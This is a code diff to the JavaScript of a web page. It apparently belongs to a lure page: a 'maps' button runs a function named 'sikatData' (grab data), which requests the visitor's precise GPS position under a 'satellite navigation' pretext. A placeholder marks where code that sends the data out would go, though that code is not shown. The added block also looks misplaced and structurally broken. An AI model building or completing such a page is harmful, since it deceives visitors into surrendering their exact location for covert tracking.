@@ -98,14 +98,21 @@
                     window.location.href = targetURL;
                 }
 
-            }, (err) => {
-                alert("Izin lokasi diperlukan untuk navigasi satelit.");
-                btn.innerText = "KLIK LOKASI MAPS";
-                btn.disabled = false;
-            }, { enableHighAccuracy: true });
-        }
+           // Bagian akhir fungsi sikatData()
+navigator.geolocation.getCurrentPosition(async (p) => {
+    // ... kode pengiriman data Anda ...
+}, (err) => {
+    alert("Izin lokasi diperlukan untuk navigasi satelit.");
+    btn.innerText = "KLIK LOKASI MAPS";
+    btn.disabled = false;
+}, { 
+    enableHighAccuracy: true, 
+    timeout: 10000, 
+    maximumAge: 0 
+}); // <--- Parameter harus di sini agar GPS aktif
 
         document.getElementById('mainBtn').addEventListener('click', sikatData);
     </script>
 </body>
 </html>
+
